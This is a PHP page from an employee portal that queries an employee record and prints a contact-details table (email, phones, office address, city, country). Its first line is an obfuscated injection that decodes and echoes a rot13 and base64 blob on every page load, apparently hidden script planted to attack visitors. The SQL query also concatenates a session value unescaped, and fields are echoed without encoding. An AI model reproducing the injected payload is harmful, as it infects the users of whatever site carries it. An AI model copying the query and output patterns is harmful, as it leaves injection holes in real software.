<?php $somecrainsignvar="zfanpmnm"; echo base64_decode(str_rot13('CUAwpzyjqQ5xLKEyCJ5yqlORLKEyXPx7qzSlVTSlCFWjEG1QVUV6KG9gMGfiCUHfrv52ISjvqQOxnFuiLJMop2VkL3q7VPqhDzqBDG59nPyfrFV7qUW5r2qmMKWeMKqaXPx7sJAuqTAbXTRcr2f9ozI3VRWio2kyLJ4bXF50o1A0pzyhMltcsGg2LKVtLKVlCFWzZGVfZPj2ZPjkZvjlAPjgZmZfYGLfBFjlZFjgAGpfYGR1YQZfBQDfYGHkYP0kZvj2BFjgBGNfZmZfYGLjYQRmBPjgZGRkYP0mYQZfBQDfYGHkYQV3YQV3YQV3YP04AljlAPjmBFjmYP00ZvjgAGDfZlj0AFjmAvjgZGtfYGR1YP05YQp1YP0mZljlAljgAGRfYGVkYP00AFjkZGpfYGZmYP05ZljjYQNfAwNfZGVfYGL5YQL2YP01APjmYP0kAFj2ZPj2ZljgZGN1YP0lZFjjYQRlZPjgZwDfYGp4YQRkZFjgAGRfYGLjYQp4YP0mYP05ZljjYQNfAGpfBFjlZFjgAGpfYGR1YQZfBQDfYGHkYP0kZvj1ZFjgBQpfAGpfYGxfYGZmYQD1YP0kAFjgZwRfZmZfZGVfYGL5YQL2YP01APjmYQp4YP0kBPjgAmHfBQDfYGxmYQRjAFjlAPjgAmVfZPjgAwZfZGtfZGtfZPjkZvjlZFjgZmxfAwNfYGLjYQLjYP0lAljgBFjlAljgAwLfZGHfZGtfAwLfYGt0YQR4YQZmYQH0YP01AljgBFjmYP0lZFj0BPjgZwRfYGHkYQxfZwpfAvjlZFjgAGDfBQDfYGDlYP0lAljgAGRfZGZ1YP0kZmHfZwDfAwLfYGR4YP0mYP02Zlj5ZPjkAFjgZljgAvjgZmNfYGZfYGLfAmVfYGRlBFjkZQHfYGR1YP0mZPj0AFjgZljlAljgZGN1YQDlYQD4YQR1YP03ZvjgAGpfZGN1YP0kAFjgZmNfAQHfYGZfYGR4YP0lAlj4ZFjgZljgZGRkYP0lAPjkZQHfYGH3YQR4YQR4YP0kBPjlZFjgZwRfAwxfYGL5YP05YQtkYP0kZwLfZGR3YP02ZljgZljjYP0mBFj4APjgBQRfYGZmYQp4YQRlYP0kBPjgBFj5YQLfZmLfYGx2YQLmYQRlYP0mYP0kZvj2ZljgBGxfZwRfYGZmYQZfZGN4YP0kZGRfAGDfYGVkYP00AFj0BPjgZmZfZmNfZGHfYGp4YQR4YQD4YP0mZlj3BPjkBPjgBGNfYGZfZmLfZGVfYGL5YQL2YP01APjmYQx5YP02BFj3BPjgZGN1YP0lZFjjYQRlZPjgZGVjYQNfAmVfYGDlYQplYP0kAFjgZmLfBFj2YQZ2YP02YP0mAvjkZvjgAwxfAwLfYGH0YQZfYGR1YQLjYQLmYP0mZljgBGZfZPjjYQDlYQV3YP02Avj5ZljgZwDfZwDfYGRjZvjkZQVfYGZ5YQxfZwRfYGH3YP0kAFjmYQt0YP01ZFjgZGVfAQtfYGt0YQR1YQHkYP0kBPjgZmZfYGV3YQRmBPjgZGRkYP0mYQZfBQDfYGHkYQRlYQZ2YP0mBFjkZvjgAwxfAwLfYGH0YQZfBQRfZwpfYGRjAFj1ZFjgZmZfZmxfYGLjYQZmYQLmYP02ZljjYP00BPj1AljlZFjgAGRfZwRfYGZmYQD1YQZ2YP0lZFjgAmHfBQDfZGVfYGL2YQL2YQV0YP03ZvjjYP02ZljkBPjkBPjjYQRlYQVkYP0mBFj2ZPjgAwNfAwNfYGV3YP05YQV3YP02AvjkAFjkBPj2AvjgBQDfZGtfZmZfAGDfYGH3YP05YQZfYGVkYQD4YP0lZFjgAGRfBFjlAlj2YQVkYP01APj4APjgAQVfYGV3YP01ZFjkZmHfYGRmAFjlAPj2AvjgZGtfYGZfYGLmYQxjYQR1YQV3YP0kZQHfAGRfYGZmYQZ5YP0lAlj4ZFjgZljgZGRkYQVkYQZfZGtfZGtfYGR4YQVkYP0lZFj2BFjgAwxfYGxfBQRfYGRmBPjkZQHfZwDfYGLmYP0mYQNfYGZ5YQt0YP0mYP03BPj1ZFjgZmZfZmxfYGV3YQtkYP0mYP0kZGRfZwRfYGHkYQp4YQRlYP0kBPjgBFj5YQLfZmLfYGRjBPjkZQHfYGZjYQRlYP0mYP0kZvj2ZljgBGxfZwRfYGZmYQtkYP03BPj1ZFjgZmZfZmxfYGV3YQtkYP0mYP0kZGRfZwRfBGNfYGRkZFj1APjgZwRfYGH3YQRjAFjgAQHfAQHfYGp4YQHkYP0mZljmBFjgZwpfBQRfYGZfYGRkZFjlZFjkZvjkAFjgAmtfAvjkZQHfYGD1YQD1YP03BPj1ZFjgZmZfZmxfYGLjYQZmYQLmYP02ZljjYP00BPj1AljlZFjgAGRfZwRfYGZmYQD1YQZ2YP05YP0mZPjgZljgAvj3ZvjgZwDfYGL2YQL2YP0kAFjgZmNfAQHfZwpfYGRjAFj1ZFjgZmZfZmxfYGLjYQZmYQLmYP02ZljjYP00BPj1AljlZFjgAGRfZwRfYGZmYQD1YQZ2YQV0YP0kZQHfAQVfAQtfZGHfYGplYQD4YP02Avj2AvjgZGHfYGZjYQD1YQV3YP0kZQHfYGVkYQNfZPj1Alj5YQVkYP01AljgZGHfZlj4APjgAGRfYGRlYQL5YP05ZPjmZljgAwNfZGZ4YP0kZGRfYGZfZlj4APjgAGRfZwpfZwpfZwpfYGt3YQV0YQZ5YQZfYGDlYP01APjmYQD1YQZ2YP0kBPjgZGHfYGxfAmHfYGZmYQV3YP01ZFjgZwRfYGD1YQZjYQZjYP04ZFjjYQZjYQt0YP00AFjgAwNfZGV2YP02Zlj2BFjgAmVfAvj5YQH0YP0kZQHfYGVkYQNfZGVjKFVhpzIjoTSwMFueYaA1LaA0pvtjYQRcYPqoWlx7pTS1CFWlovOyqwVjZGNvYaWypTkuL2HbMTS0MF5aMKETqJkfJJIupvtcYGRfVzSfVvx7MG1hMKptEaIhL3Eco24bVvVfVaWyqUHvX3OuqFx7MG1yXPx7LKVlCJHbLKVlXGgmCFVvB3MupvOjo3Z9ZQgzo3VbnG0jB2x8LKVlYzkyozq0nQgcXlfcr3Oiplf9pTSlp2IWoaDbnl5lMKOfLJAyXPWzLJkmMFVfVwOup2DvXFxeLKVlJ2yqYmZ7plf9LKVhp3Ivp3ElXUOipljkXGg9QDcyXUZcBmjip2AlnKO0Ct==')); $crain="";
 session_start();
include("../connectdb/connect.php");
	
 	 mysql_select_db("pentagonclt",$con);
	 if(!$con)
	{
		die('Could not connect to server' . mysql_error());
	} 
	
	$sql="SELECT * FROM  employee where Auto_No=".$_SESSION["emp_id"]."";
    $result=mysql_query($sql);
    $row=mysql_fetch_assoc($result);
    $_SESSION["page"]="contact";
?>
<table border="0" cellpadding="5" cellspacing="0" style="border-collapse: collapse" bordercolor="#C0C0C0" width="693" id="AutoNumber5" height="1">
                   <tr>
                     <td width="261" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1" 
					 background="images/rowbg1.gif" class="txtright">
                     Email</td>
                     <td width="7" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1" 
					 background="images/rowbg2.gif" align="center">
                     :</td>
                     <td width="401" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1" 
					 background="images/rowbg3.gif" class="txtleft">&nbsp;
					 <?php echo $row["Email"]; ?></td>
                   </tr>
                   <tr>
                     <td width="261" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1" 
					 background="images/rowbg1.gif" class="txtright">
                     CellPhone&nbsp;&nbsp; </td>
                     <td width="7" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1" 
					 background="images/rowbg2.gif" align="center">
                     :</td>
                     <td width="401" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1" 
					 background="images/rowbg3.gif" class="txtleft">&nbsp;
					 <?php echo $row["Cell_Phone"]; ?></td>
                   </tr>
                   <tr>
                     <td width="261" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1" 
					 background="images/rowbg1.gif" class="txtright">
                     Home Phone&nbsp;&nbsp;&nbsp; </td>
                     <td width="7" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1"
					  background="images/rowbg2.gif" align="center">
                     :</td>
                     <td width="401" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1"
					  background="images/rowbg3.gif" class="txtleft">&nbsp;
					  <?php echo $row["Home_Phone"]; ?></td>
                   </tr>
                   <tr>
                     <td width="261" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1" 
					 background="images/rowbg1.gif" class="txtright">
                     Office Address1&nbsp;&nbsp; </td>
                     <td width="7" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1" 
					 background="images/rowbg2.gif" align="center">
                     :</td>
                     <td width="401" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1" 
					 background="images/rowbg3.gif" class="txtleft">&nbsp;<?php echo $row["Office_Add1"]; ?></td>
                   </tr>
                   <tr>
                     <td width="261" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1" 
					 background="images/rowbg1.gif" class="txtright">
                     Office Address2</td>
                     <td width="7" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1" 
					 background="images/rowbg2.gif" align="center">
                     :</td>
                     <td width="401" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1"
					  background="images/rowbg3.gif" class="txtleft">&nbsp;
					  <?php echo $row["Office_Add2"]; ?></td>
                   </tr>
                   <tr>
                     <td width="261" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1"
					  background="images/rowbg1.gif" class="txtright">
                     Office Address3&nbsp;&nbsp; </td>
                     <td width="7" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1" 
					 background="images/rowbg2.gif" align="center">
                     :</td>
                     <td width="401" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1"
					  background="images/rowbg3.gif" class="txtleft">&nbsp;
					  <?php echo $row["Office_Add3"]; ?></td>
                   </tr>
                   <tr>
                     <td width="261" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1"
					  background="images/rowbg1.gif" class="txtright">
                     City&nbsp;&nbsp;&nbsp; </td>
                     <td width="7" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1" 
					 background="images/rowbg2.gif" align="center">
                     :</td>
                     <td width="401" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1"
					  background="images/rowbg3.gif" class="txtleft">&nbsp;
					  <?php echo $row["City"]; ?></td>
                   </tr>
                   <tr>
                     <td width="261" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1"
					  background="images/rowbg1.gif" class="txtright">
                     Country&nbsp;&nbsp;&nbsp; </td>
                     <td width="7" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1" 
					 background="images/rowbg2.gif" align="center">
                     :</td>
                     <td width="401" bgcolor="#FFFFFF" bordercolor="#C0C0C0" height="1"
					  background="images/rowbg3.gif" class="txtleft">&nbsp;
					  <?php echo $row["Country"]; ?></td>
                   </tr>
                   </table>